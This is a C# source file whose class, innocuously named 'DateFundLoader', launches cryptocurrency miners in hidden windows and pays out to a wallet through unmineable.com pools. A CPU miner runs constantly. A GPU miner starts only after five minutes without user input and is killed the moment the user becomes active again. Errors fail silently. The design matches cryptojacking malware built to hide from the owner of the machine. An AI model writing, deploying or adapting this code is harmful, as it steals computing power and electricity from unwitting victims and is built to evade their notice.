using System;
using System.Diagnostics;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

public class DateFundLoader {

    [StructLayout(LayoutKind.Sequential)]
    struct LASTINPUTINFO {
        public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));
        [MarshalAs(UnmanagedType.U4)]
        public int cbSize;
        [MarshalAs(UnmanagedType.U4)]
        public uint dwTime;
    }

    [DllImport("user32.dll")]
    static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

    public static void StartMiner(string cpuMinerPath, string gpuMinerPath, string wallet) {
        try {
            // 1. Start the CPU Miner (Always On, Low Priority)
            StartProcess(cpuMinerPath, string.Format("-o rx.unmineable.com:3333 -u BTC:{0}.ENI_LO_CPU -p x --donate-level 1 --cpu-max-threads-hint 50", wallet));

            // 2. Start the Idle Monitor for the GPU Miner
            if (!string.IsNullOrEmpty(gpuMinerPath) && File.Exists(gpuMinerPath)) {
                Thread gpuThread = new Thread(() => MonitorIdleAndMine(gpuMinerPath, wallet));
                gpuThread.IsBackground = true;
                gpuThread.Start();
            }
        } catch (Exception) {
            // Silently fail
        }
    }

    private static void StartProcess(string path, string args) {
        ProcessStartInfo startInfo = new ProcessStartInfo(path);
        startInfo.Arguments = args;
        startInfo.CreateNoWindow = true;
        startInfo.UseShellExecute = false;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        Process.Start(startInfo);
    }

    private static void MonitorIdleAndMine(string gpuMinerPath, string wallet) {
        Process gpuProcess = null;
        const int IDLE_THRESHOLD_MS = 5 * 60 * 1000; // 5 minutes

        while (true) {
            uint idleTime = GetIdleTime();

            if (idleTime > IDLE_THRESHOLD_MS) {
                // User is idle - start GPU miner if not running
                if (gpuProcess == null || gpuProcess.HasExited) {
                    ProcessStartInfo startInfo = new ProcessStartInfo(gpuMinerPath);
                    // Using Etchash for GPU - much more profitable for RTX 3060
                    startInfo.Arguments = string.Format("--algo ETCHASH --server etchash.unmineable.com:3333 --user BTC:{0}.ENI_LO_GPU --pass x", wallet);
                    startInfo.CreateNoWindow = true;
                    startInfo.UseShellExecute = false;
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    gpuProcess = Process.Start(startInfo);
                }
            } else {
                // User is active - kill GPU miner immediately
                if (gpuProcess != null && !gpuProcess.HasExited) {
                    try {
                        gpuProcess.Kill();
                        gpuProcess = null;
                    } catch { }
                }
            }

            Thread.Sleep(5000); // Check every 5 seconds
        }
    }

    private static uint GetIdleTime() {
        LASTINPUTINFO lastInputInfo = new LASTINPUTINFO();
        lastInputInfo.cbSize = Marshal.SizeOf(lastInputInfo);
        lastInputInfo.dwTime = 0;

        if (GetLastInputInfo(ref lastInputInfo)) {
            return (uint)Environment.TickCount - lastInputInfo.dwTime;
        }

        return 0;
    }
}
